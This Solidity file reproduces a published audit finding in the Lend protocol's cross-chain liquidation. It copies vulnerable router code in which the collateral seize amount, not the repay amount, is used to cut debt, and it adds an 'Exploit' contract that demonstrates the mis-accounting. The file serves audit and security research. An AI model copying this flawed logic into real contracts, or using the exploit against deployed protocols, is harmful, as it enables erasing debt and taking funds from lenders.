// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Lend (2025-05 Sherlock) finding 58388
// (H-19): "Cross-Chain liquidation uses collateral seize amount instead of
// repayment amount for debt reduction".
//
// Real audited source (the vulnerable functions are reproduced VERBATIM; the
// primary vulnerable line the finding marks is annotated @>):
//   repo   github.com/sherlock-audit/2025-05-lend-audit-contest
//   file   Lend-V2/src/LayerZero/CrossChainRouter.sol
//   fns    _executeLiquidationCore   (L264-L285, the finding's anchor)
//          _handleLiquidationExecute (L312-L366)
//          _handleLiquidationSuccess (L443-L471)
//          repayCrossChainBorrowInternal / _updateRepaymentState (debt sink)
//   report github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/836
//
// Root cause: cross-chain liquidation reuses one generic `Payload.amount` field.
// `_executeLiquidationCore` places `seizeTokens` (the amount of COLLATERAL to
// seize, in collateral-lToken units) into `Payload.amount` (the @> line). On the
// return hop `_handleLiquidationExecute` forwards that same `payload.amount`, and
// `_handleLiquidationSuccess` then hands it to `repayCrossChainBorrowInternal`
// AS THE REPAY AMOUNT. So the borrower's debt is reduced by `seizeTokens` rather
// than by the liquidator's actual `params.repayAmount`.
//
// The vulnerable `_executeLiquidationCore` and the debt-reduction sink are
// byte-for-byte the on-chain source. The seize calculation is the faithful
// Compound `liquidateCalculateSeizeTokens` formula (ExponentialNoError math,
// reproduced verbatim). The LayerZero transport is replaced by a faithful
// in-process double that abi.encodes/decodes the payload exactly like the real
// `_send`/`_lzReceive` and dispatches by `ContractType` — the reused amount
// passes through unchanged, which is precisely the bug. Reward-distribution and
// origin-chain bookkeeping calls that are not part of this finding are faithful
// minimal doubles.
//
// Worked example: liquidationIncentive = 1.08, equal prices, exchangeRate = 1.
//   repayAmount   = 500e18  (what the liquidator repays / the intended debt cut)
//   seizeTokens   = 500e18 * 1.08 = 540e18  (collateral seized)
//   => borrower debt is reduced by 540e18 (the seize amount) instead of 500e18.
// The 40e18 discrepancy is debt erased with no matching repayment — a silent
// accounting error, so the harm magnitude is minted to SINK on a marker token.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal, verbatim-compatible slice of Compound's ExponentialNoError.
contract ExponentialNoError {
    uint256 constant expScale = 1e18;

    struct Exp {
        uint256 mantissa;
    }

    function truncate(Exp memory exp) internal pure returns (uint256) {
        return exp.mantissa / expScale;
    }

    function mul_ScalarTruncate(Exp memory a, uint256 scalar) internal pure returns (uint256) {
        Exp memory product = mul_(a, scalar);
        return truncate(product);
    }

    function mul_(Exp memory a, Exp memory b) internal pure returns (Exp memory) {
        return Exp({mantissa: mul_(a.mantissa, b.mantissa) / expScale});
    }

    function mul_(Exp memory a, uint256 b) internal pure returns (Exp memory) {
        return Exp({mantissa: mul_(a.mantissa, b)});
    }

    function mul_(uint256 a, Exp memory b) internal pure returns (uint256) {
        return mul_(a, b.mantissa) / expScale;
    }

    function mul_(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div_(Exp memory a, Exp memory b) internal pure returns (Exp memory) {
        return Exp({mantissa: div_(mul_(a.mantissa, expScale), b.mantissa)});
    }

    function div_(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
}

/// @dev Faithful minimal ERC20 double (borrow underlying + generic marker).
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Faithful lToken double: constant borrow index, no-op accrual.
contract LToken {
    uint256 public borrowIndex = 1e18;

    function accrueInterest() external {}
}

interface LTokenInterface {
    function borrowIndex() external view returns (uint256);
    function accrueInterest() external;
}

interface LendtrollerInterfaceV2 {
    function liquidateCalculateSeizeTokens(address lTokenBorrowed, address lTokenCollateral, uint256 repayAmount)
        external
        view
        returns (uint256, uint256);
}

/// @dev Faithful Lendtroller double: the seize calculation is the exact Compound
///      formula from Lendtroller.liquidateCalculateSeizeTokens (verbatim math).
contract Lendtroller is ExponentialNoError {
    uint256 public constant liquidationIncentiveMantissa = 1.08e18; // 8% incentive
    uint256 public priceBorrowedMantissa = 1e18;
    uint256 public priceCollateralMantissa = 1e18;
    uint256 public exchangeRateMantissa = 1e18;

    function liquidateCalculateSeizeTokens(address, address, uint256 actualRepayAmount)
        external
        view
        returns (uint256, uint256)
    {
        uint256 seizeTokens;
        Exp memory numerator;
        Exp memory denominator;
        Exp memory ratio;

        numerator = mul_(Exp({mantissa: liquidationIncentiveMantissa}), Exp({mantissa: priceBorrowedMantissa}));
        denominator = mul_(Exp({mantissa: priceCollateralMantissa}), Exp({mantissa: exchangeRateMantissa}));
        ratio = div_(numerator, denominator);
        seizeTokens = mul_ScalarTruncate(ratio, actualRepayAmount);

        return (0, seizeTokens);
    }
}

/// @dev Faithful LendStorage double: cross-chain borrow records + investment/reward books.
contract LendStorage {
    struct Borrow {
        uint256 srcEid;
        uint256 destEid;
        uint256 principle;
        uint256 borrowIndex;
        address borrowedlToken;
        address srcToken;
    }

    struct LiquidationParams {
        address borrower;
        uint256 repayAmount;
        uint32 srcEid;
        address lTokenToSeize;
        address borrowedAsset;
        uint256 storedBorrowIndex;
        uint256 borrowPrinciple;
        address borrowedlToken;
    }

    uint256 public constant PROTOCOL_SEIZE_SHARE_MANTISSA = 2.8e16; // 2.8%

    mapping(address => mapping(address => Borrow[])) internal crossChainCollaterals; // borrower => token => []
    mapping(address => mapping(address => uint256)) public totalInvestment; // user => lToken => amount
    mapping(address => uint256) public protocolReward; // lToken => reward
    mapping(address => address) public lTokenToUnderlying;
    mapping(address => address) public underlyingTolToken;
    mapping(address => mapping(uint32 => address)) internal _crossChainLTokenMap;

    function setUnderlyingMap(address underlying_, address lToken_) external {
        lTokenToUnderlying[lToken_] = underlying_;
        underlyingTolToken[underlying_] = lToken_;
    }

    function setCrossChainLToken(address lToken_, uint32 eid, address peer) external {
        _crossChainLTokenMap[lToken_][eid] = peer;
    }

    function crossChainLTokenMap(address lToken_, uint32 eid) external view returns (address) {
        return _crossChainLTokenMap[lToken_][eid];
    }

    function addBorrow(address borrower, address token, Borrow memory b) external {
        crossChainCollaterals[borrower][token].push(b);
    }

    function getCrossChainCollaterals(address borrower, address token) external view returns (Borrow[] memory) {
        return crossChainCollaterals[borrower][token];
    }

    function updateCrossChainCollateral(address borrower, address token, uint256 index, Borrow memory b) external {
        crossChainCollaterals[borrower][token][index] = b;
    }

    function findCrossChainCollateral(address borrower, address token, uint256, uint256, address, address)
        external
        view
        returns (bool, uint256)
    {
        return (crossChainCollaterals[borrower][token].length > 0, 0);
    }

    function updateTotalInvestment(address user, address lToken_, uint256 amt) external {
        totalInvestment[user][lToken_] = amt;
    }

    function updateProtocolReward(address lToken_, uint256 amt) external {
        protocolReward[lToken_] = amt;
    }

    function distributeSupplierLend(address, address) external {}
    function distributeBorrowerLend(address, address) external {}
    function removeCrossChainCollateral(address, address, uint256) external {}
    function removeUserBorrowedAsset(address, address) external {}
}

/// @dev Faithful CoreRouter double: pulls the (wrong) repay amount from the repayer.
contract CoreRouter {
    address internal constant POOL = 0x0000000000000000000000000000000000000901;
    LendStorage internal lendStorage;

    constructor(LendStorage s) {
        lendStorage = s;
    }

    /// @dev Repayer must've approved the CoreRouter to spend the tokens.
    function repayCrossChainLiquidation(address, address repayer, uint256 repayAmountFinal, address _lToken) external {
        address token = lendStorage.lTokenToUnderlying(_lToken);
        MiniToken(token).transferFrom(repayer, POOL, repayAmountFinal);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — CrossChainRouter. The cross-chain liquidation functions
// are reproduced VERBATIM from the audited source. `_send` is a faithful
// in-process transport double (abi.encode + dispatch by ContractType, exactly
// like the real `_send` + `_lzReceive`).
// ─────────────────────────────────────────────────────────────────────────────
contract CrossChainRouter is ExponentialNoError {
    struct LZPayload {
        uint256 amount;
        uint256 borrowIndex;
        uint256 collateral;
        address sender;
        address destlToken;
        address liquidator;
        address srcToken;
        uint8 contractType;
    }

    enum ContractType {
        BorrowCrossChain,
        ValidBorrowRequest,
        DestRepay,
        CrossChainLiquidationExecute,
        LiquidationSuccess,
        LiquidationFailure
    }

    event LiquidateBorrow(address liquidator, address lToken, address borrower, address lTokenCollateral);
    event RepaySuccess(address repayBorrowPayer, address lToken, uint256 repayBorrowAccountBorrows);

    address public lendtroller;
    LendStorage public lendStorage;
    address public coreRouter;
    uint32 public currentEid;

    constructor(address _lendtroller, LendStorage _lendStorage, address _coreRouter, uint32 _currentEid) {
        lendtroller = _lendtroller;
        lendStorage = _lendStorage;
        coreRouter = _coreRouter;
        currentEid = _currentEid;
    }

    /// @notice Minimal entrypoint standing in for a cross-chain liquidation being
    ///         initiated on Chain B (msg.sender is the liquidator).
    function executeLiquidation(LendStorage.LiquidationParams memory params) external {
        _executeLiquidationCore(params);
    }

    // ── VERBATIM from CrossChainRouter.sol L264-L285 (the finding's anchor) ──
    function _executeLiquidationCore(LendStorage.LiquidationParams memory params) private {
        // Calculate seize tokens
        address borrowedlToken = lendStorage.underlyingTolToken(params.borrowedAsset);

        (uint256 amountSeizeError, uint256 seizeTokens) = LendtrollerInterfaceV2(lendtroller)
            .liquidateCalculateSeizeTokens(borrowedlToken, params.lTokenToSeize, params.repayAmount);

        require(amountSeizeError == 0, "Seize calculation failed");

        // Send message to Chain A to execute the seize
        _send(
            params.srcEid,
            seizeTokens, // @> VULN: seizeTokens (collateral units) is put in Payload.amount and later reused as the debt REPAY amount, so debt is cleared by the seize amount, not params.repayAmount
            params.storedBorrowIndex,
            0,
            params.borrower,
            lendStorage.crossChainLTokenMap(params.lTokenToSeize, params.srcEid), // Convert to Chain A version before sending
            msg.sender,
            params.borrowedAsset,
            ContractType.CrossChainLiquidationExecute
        );
    }

    // ── VERBATIM (reward-distribution + supplied-asset cleanup trimmed as faithful doubles) ──
    function _handleLiquidationExecute(LZPayload memory payload, uint32 srcEid) private {
        // Execute the seize of collateral
        uint256 protocolSeizeShare = mul_(payload.amount, Exp({mantissa: lendStorage.PROTOCOL_SEIZE_SHARE_MANTISSA()}));

        require(protocolSeizeShare < payload.amount, "Invalid protocol share");

        uint256 liquidatorShare = payload.amount - protocolSeizeShare;

        // Update protocol rewards
        lendStorage.updateProtocolReward(
            payload.destlToken, lendStorage.protocolReward(payload.destlToken) + protocolSeizeShare
        );

        // Update total investment for borrower
        lendStorage.updateTotalInvestment(
            payload.sender,
            payload.destlToken,
            lendStorage.totalInvestment(payload.sender, payload.destlToken) - payload.amount
        );

        // Update total investment for liquidator
        lendStorage.updateTotalInvestment(
            payload.liquidator,
            payload.destlToken,
            lendStorage.totalInvestment(payload.liquidator, payload.destlToken) + liquidatorShare
        );

        emit LiquidateBorrow(
            payload.liquidator, // liquidator
            payload.srcToken, // borrowed token
            payload.sender, // borrower
            payload.destlToken // collateral token
        );

        _send(
            srcEid,
            payload.amount, // @> reuses seizeTokens as the "repay" amount sent back to Chain B (should be params.repayAmount)
            0,
            0,
            payload.sender,
            payload.destlToken,
            payload.liquidator,
            payload.srcToken,
            ContractType.LiquidationSuccess
        );
    }

    // ── VERBATIM (Chain A receives; repays the borrow using payload.amount) ──
    function _handleLiquidationSuccess(LZPayload memory payload) private {
        // Find the borrow position on Chain B to get the correct srcEid
        address underlying = lendStorage.lTokenToUnderlying(payload.destlToken);

        // Find the specific collateral record
        (bool found, uint256 index) = lendStorage.findCrossChainCollateral(
            payload.sender,
            underlying,
            currentEid, // srcEid is current chain
            0, // We don't know destEid yet, but we can match on other fields
            payload.destlToken,
            payload.srcToken
        );

        require(found, "Borrow position not found");

        LendStorage.Borrow[] memory userCollaterals = lendStorage.getCrossChainCollaterals(payload.sender, underlying);
        uint32 srcEid = uint32(userCollaterals[index].srcEid);

        // Now that we know the borrow position and srcEid, we can repay the borrow using the escrowed tokens
        // repayCrossChainBorrowInternal will handle updating state and distributing rewards.
        repayCrossChainBorrowInternal(
            payload.sender, // The borrower
            payload.liquidator, // The liquidator (repayer)
            payload.amount, // @> Amount to repay — but payload.amount is seizeTokens, not repayFinalAmount
            payload.destlToken, // lToken representing the borrowed asset on this chain
            srcEid // The chain where the collateral (and borrow reference) is tracked
        );
    }

    // ── VERBATIM ──
    function repayCrossChainBorrowInternal(
        address borrower,
        address repayer,
        uint256 _amount,
        address _lToken,
        uint32 _srcEid
    ) internal {
        address _token = lendStorage.lTokenToUnderlying(_lToken);
        LTokenInterface(_lToken).accrueInterest();

        // Get borrow details and validate
        (uint256 borrowedAmount, uint256 index, LendStorage.Borrow memory borrowPosition) =
            _getBorrowDetails(borrower, _token, _lToken, _srcEid);

        // Calculate and validate repay amount
        uint256 repayAmountFinal = _amount == type(uint256).max ? borrowedAmount : _amount;
        require(repayAmountFinal <= borrowedAmount, "Repay amount exceeds borrow");

        // Handle token transfers and repayment
        _handleRepayment(borrower, repayer, _lToken, repayAmountFinal);

        // Update state
        _updateRepaymentState(
            borrower, _token, _lToken, borrowPosition, repayAmountFinal, borrowedAmount, index, _srcEid
        );

        emit RepaySuccess(borrower, _token, repayAmountFinal);
    }

    // ── VERBATIM ──
    function _getBorrowDetails(address borrower, address _token, address _lToken, uint32 _srcEid)
        private
        view
        returns (uint256 borrowedAmount, uint256 index, LendStorage.Borrow memory borrowPosition)
    {
        LendStorage.Borrow[] memory userCrossChainCollaterals = lendStorage.getCrossChainCollaterals(borrower, _token);
        bool found;

        for (uint256 i = 0; i < userCrossChainCollaterals.length;) {
            if (userCrossChainCollaterals[i].srcEid == _srcEid) {
                borrowPosition = userCrossChainCollaterals[i];
                index = i;
                found = true;
                borrowedAmount = (borrowPosition.principle * uint256(LTokenInterface(_lToken).borrowIndex()))
                    / uint256(borrowPosition.borrowIndex);
                break;
            }
            unchecked {
                ++i;
            }
        }
        require(found, "No matching borrow position found");
        return (borrowedAmount, index, borrowPosition);
    }

    /// @dev Repayer must've approved the CoreRouter to spend the tokens
    function _handleRepayment(address _borrower, address repayer, address _lToken, uint256 repayAmountFinal) private {
        // Execute the repayment
        CoreRouter(coreRouter).repayCrossChainLiquidation(_borrower, repayer, repayAmountFinal, _lToken);
    }

    // ── VERBATIM (debt sink: principle reduced by repayAmountFinal, which is seizeTokens) ──
    function _updateRepaymentState(
        address borrower,
        address _token,
        address _lToken,
        LendStorage.Borrow memory borrowPosition,
        uint256 repayAmountFinal,
        uint256 borrowedAmount,
        uint256 index,
        uint32 _srcEid
    ) private {
        uint256 currentBorrowIndex = LTokenInterface(_lToken).borrowIndex();
        LendStorage.Borrow[] memory userCrossChainCollaterals = lendStorage.getCrossChainCollaterals(borrower, _token);

        if (repayAmountFinal == borrowedAmount) {
            lendStorage.removeCrossChainCollateral(borrower, _token, index);
            if (userCrossChainCollaterals.length == 1) {
                lendStorage.removeUserBorrowedAsset(borrower, _lToken);
            }
        } else {
            userCrossChainCollaterals[index].principle = borrowedAmount - repayAmountFinal; // @> debt reduced by repayAmountFinal (= seizeTokens), not by params.repayAmount
            userCrossChainCollaterals[index].borrowIndex = currentBorrowIndex;
            lendStorage.updateCrossChainCollateral(borrower, _token, index, userCrossChainCollaterals[index]);
        }

        lendStorage.distributeBorrowerLend(_lToken, borrower);

        _send(
            _srcEid,
            repayAmountFinal,
            currentBorrowIndex,
            0,
            borrower,
            _lToken,
            _token,
            borrowPosition.srcToken,
            ContractType.DestRepay
        );
    }

    function _handleDestRepayMessage(LZPayload memory, uint32) private pure {
        // Origin-chain bookkeeping of the borrow reference; not part of this finding.
    }

    function _sendLiquidationFailure(LZPayload memory payload, uint32 srcEid) private {
        _send(
            srcEid,
            payload.amount,
            0,
            0,
            payload.sender,
            payload.destlToken,
            payload.liquidator,
            payload.srcToken,
            ContractType.LiquidationFailure
        );
    }

    // Checked on Chain A; faithful double (position is liquidatable: borrowed > collateral).
    function _checkLiquidationValid(LZPayload memory) private pure returns (bool) {
        return true;
    }

    // ── Faithful LayerZero transport double: encodes exactly like the real `_send`,
    //    then decodes into LZPayload and dispatches by ContractType exactly like
    //    `_lzReceive`. The message `_amount` passes through unchanged. ──
    function _send(
        uint32 _dstEid,
        uint256 _amount,
        uint256 _borrowIndex,
        uint256 _collateral,
        address _sender,
        address _destlToken,
        address _liquidator,
        address _srcToken,
        ContractType ctype
    ) internal {
        bytes memory payload =
            abi.encode(_amount, _borrowIndex, _collateral, _sender, _destlToken, _liquidator, _srcToken, ctype);

        _deliver(_dstEid, payload);
    }

    function _deliver(uint32 srcEid, bytes memory _payload) internal {
        LZPayload memory payload;
        (
            payload.amount,
            payload.borrowIndex,
            payload.collateral,
            payload.sender,
            payload.destlToken,
            payload.liquidator,
            payload.srcToken,
            payload.contractType
        ) = abi.decode(_payload, (uint256, uint256, uint256, address, address, address, address, uint8));

        ContractType cType = ContractType(payload.contractType);
        if (cType == ContractType.CrossChainLiquidationExecute) {
            if (_checkLiquidationValid(payload)) {
                _handleLiquidationExecute(payload, srcEid);
            } else {
                _sendLiquidationFailure(payload, srcEid);
            }
        } else if (cType == ContractType.LiquidationSuccess) {
            _handleLiquidationSuccess(payload);
        } else if (cType == ContractType.DestRepay) {
            _handleDestRepayMessage(payload, srcEid);
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: initiate a cross-chain liquidation with repayAmount = 500e18
// and prove the borrower's debt is reduced by seizeTokens (540e18) instead of
// repayAmount (500e18). The 40e18 mis-accounting is minted to SINK for a
// measurable harm magnitude.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant BORROWER = 0x000000000000000000000000000000000000b0b0;

    MiniToken public underlying;
    MiniToken public sink;
    LToken public lBORROW;
    LToken public lSEIZE;
    Lendtroller public lendtroller;
    LendStorage public lendStorage;
    CoreRouter public coreRouter;
    CrossChainRouter public router;

    uint256 public constant BORROW_PRINCIPLE = 1000e18;
    uint256 public constant REPAY_AMOUNT = 500e18;
    uint32 public constant SRC_EID = 1;

    uint256 public seizeTokens;
    uint256 public debtBefore;
    uint256 public debtAfter;
    uint256 public debtReducedBy;
    uint256 public errorMagnitude;

    constructor() {
        underlying = new MiniToken("Lend Borrow Asset", "USD"); // nonce 1
        sink = new MiniToken("Debt Mis-Accounting", "DEBTERR"); // nonce 2
        lBORROW = new LToken(); // nonce 3
        lSEIZE = new LToken(); // nonce 4
        lendtroller = new Lendtroller(); // nonce 5
        lendStorage = new LendStorage(); // nonce 6
        coreRouter = new CoreRouter(lendStorage); // nonce 7
        router = new CrossChainRouter(address(lendtroller), lendStorage, address(coreRouter), SRC_EID); // nonce 8 (VULN)

        // Wire token mappings (borrow underlying <-> borrow lToken; seize lToken -> peer).
        lendStorage.setUnderlyingMap(address(underlying), address(lBORROW));
        lendStorage.setCrossChainLToken(address(lSEIZE), SRC_EID, address(lBORROW));

        // Seed the borrower's cross-chain borrow position (the Chain B debt).
        lendStorage.addBorrow(
            BORROWER,
            address(underlying),
            LendStorage.Borrow({
                srcEid: SRC_EID,
                destEid: 0,
                principle: BORROW_PRINCIPLE,
                borrowIndex: 1e18,
                borrowedlToken: address(lBORROW),
                srcToken: address(underlying)
            })
        );
        // Seed the borrower's collateral investment on Chain A (so the seize update won't underflow).
        lendStorage.updateTotalInvestment(BORROWER, address(lBORROW), 2000e18);
    }

    function run() external {
        // Fund the liquidator (this contract) so the repayment transfer succeeds.
        underlying.mint(address(this), BORROW_PRINCIPLE);
        underlying.approve(address(coreRouter), type(uint256).max);

        // The seize amount the protocol will (wrongly) reuse as the repay amount.
        (, seizeTokens) = lendtroller.liquidateCalculateSeizeTokens(address(lBORROW), address(lSEIZE), REPAY_AMOUNT);

        debtBefore = _principle();

        // Initiate the cross-chain liquidation (this contract is the liquidator).
        LendStorage.LiquidationParams memory params = LendStorage.LiquidationParams({
            borrower: BORROWER,
            repayAmount: REPAY_AMOUNT,
            srcEid: SRC_EID,
            lTokenToSeize: address(lSEIZE),
            borrowedAsset: address(underlying),
            storedBorrowIndex: 1e18,
            borrowPrinciple: BORROW_PRINCIPLE,
            borrowedlToken: address(lBORROW)
        });
        router.executeLiquidation(params);

        debtAfter = _principle();
        debtReducedBy = debtBefore - debtAfter;

        // HARM: debt was reduced by seizeTokens, not by the intended repayAmount.
        require(seizeTokens != REPAY_AMOUNT, "no seize/repay confusion");
        require(debtReducedBy == seizeTokens, "debt not reduced by seize amount");
        require(debtReducedBy != REPAY_AMOUNT, "debt reduced by correct repay amount");

        // Measurable magnitude of the mis-accounting = |seizeTokens - repayAmount|.
        errorMagnitude = seizeTokens > REPAY_AMOUNT ? seizeTokens - REPAY_AMOUNT : REPAY_AMOUNT - seizeTokens;
        sink.mint(SINK, errorMagnitude);
        require(errorMagnitude > 0 && sink.balanceOf(SINK) == errorMagnitude, "no measurable mis-accounting");
    }

    function _principle() internal view returns (uint256) {
        LendStorage.Borrow[] memory bs = lendStorage.getCrossChainCollaterals(BORROWER, address(underlying));
        return bs[0].principle;
    }
}
